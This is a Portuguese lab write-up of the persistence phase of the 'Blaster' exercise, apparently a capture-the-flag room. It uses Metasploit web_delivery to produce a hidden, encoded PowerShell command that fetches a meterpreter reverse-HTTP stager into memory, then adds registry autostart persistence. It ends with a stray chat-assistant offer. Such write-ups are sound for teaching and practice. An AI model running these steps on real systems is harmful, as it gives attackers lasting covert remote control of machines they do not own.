# Persistência — Laboratório Blaster

Esta etapa corresponde à fase de **pós-exploração**, cujo objetivo é estabelecer um mecanismo de persistência na máquina comprometida. O cenário assume que privilégios administrativos já foram obtidos no host Windows alvo.

O método utilizado baseia-se no módulo `web_delivery` do Metasploit Framework, responsável por gerar um *stager* que executa um payload diretamente em memória via PowerShell. Esse mecanismo permite entregar o payload sem a necessidade de gravar binários no disco da vítima, reduzindo a superfície de detecção.

Inicialmente, o módulo apropriado é carregado no console do framework.

```
msfconsole
use exploit/multi/script/web_delivery
```

Em seguida, é necessário selecionar o target correspondente à execução via PowerShell.

```
show targets
set TARGET 2
```

O payload escolhido é `windows/meterpreter/reverse_http`. Esse payload estabelece uma conexão reversa utilizando HTTP como canal de comunicação entre o host comprometido e o atacante.

```
set payload windows/meterpreter/reverse_http
```

Após a seleção do payload, os parâmetros operacionais devem ser configurados.

```
set LHOST 192.168.178.118
set LPORT 4444
set SRVPORT 8080
```

Parâmetros relevantes:

* **LHOST**: endereço IP do host atacante que receberá a conexão reversa.
* **LPORT**: porta de escuta do handler do payload.
* **SRVPORT**: porta utilizada pelo servidor temporário responsável por entregar o stager PowerShell.

Com as opções configuradas, o módulo gera automaticamente um comando PowerShell ofuscado que realiza o download e execução do stager em memória.

Exemplo de comando gerado:

```
powershell.exe -nop -w hidden -e WwB[...payload codificado...]gAUQAuA
```

Parâmetros relevantes do comando:

* `-nop` desativa o carregamento do perfil do PowerShell.
* `-w hidden` executa o processo de forma oculta.
* `-e` indica que o conteúdo subsequente está codificado em Base64.

Esse comando deve ser executado no PowerShell da máquina comprometida com privilégios administrativos.

Após a execução, o host alvo estabelece comunicação com o handler configurado no Metasploit, resultando na criação de uma sessão `meterpreter`.

A verificação da sessão ativa pode ser realizada com:

```
sessions
```

Conexão à sessão estabelecida:

```
sessions -i 1
```

Uma vez dentro do ambiente `meterpreter`, é possível validar o contexto de privilégios do processo comprometido.

```
getuid
```

Exemplo de retorno:

```
Server username: NT AUTHORITY\SYSTEM
```

Com privilégios elevados confirmados, o próximo passo consiste em implantar um mecanismo de persistência no sistema alvo. Para isso, utiliza-se o módulo de persistência local disponível no framework.

```
run exploit/windows/local/persistence -X
```

A opção `-X` configura a execução automática do payload durante a inicialização do sistema, tipicamente através da criação de entradas no registro do Windows associadas ao processo de logon.

Esse procedimento garante que o payload seja executado novamente sempre que o sistema for reiniciado, restabelecendo automaticamente a sessão reversa com o host atacante.


Se desejar, é possível também avaliar **como writeups avançados de pentest são estruturados** (os usados por profissionais ou por jogadores de Hack The Box). Isso eleva bastante o nível do material.
